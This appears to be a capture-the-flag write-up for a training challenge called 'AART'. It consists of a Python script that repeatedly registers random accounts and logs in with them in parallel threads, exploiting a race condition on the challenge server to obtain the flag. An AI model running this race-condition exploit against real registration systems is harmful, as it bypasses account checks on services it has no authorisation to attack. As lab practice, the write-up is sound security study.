# AART

Do you have enough karma?

http://aart.training.jinblack.it


```python
import requests
import string
import random
import sys
import threading
import time

EP = "http://aart.training.jinblack.it"

#finish used to stop all threads if the flag is found
_FINISH = False

#random string generator
def rand_string(N=10):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

def register(u,p):
	url = "%s/register.php" % EP
	data = {"username":u, "password": p}
	r = requests.post(url, data = data)
	print(r)
	if "SUCCESS!" in r.text:
		return True
	return False

def login(u, p):
	global _FINISH
	url = "%s/login.php" % EP
	data = {"username":u, "password": p}
	r = requests.post(url, data = data)
	print(r)

	#print the flag and set finish to true
	if "flag{" in r.text:
		print(r.text)
		_FINISH = True


#a while true with threading is to not do the register and login sequentially
while True:
	#exit the thread generation if I found the flag
	if _FINISH:
            break
	u = rand_string()
	p = rand_string()

	r = threading.Thread(target=register, args=(u, p))
	r.start()

	l = threading.Thread(target=login, args=(u, p))
	l.start()

	time.sleep(0.1)


#to have a shell at the end of the execution to try out stuff after those written
import IPython
IPython.embed()

```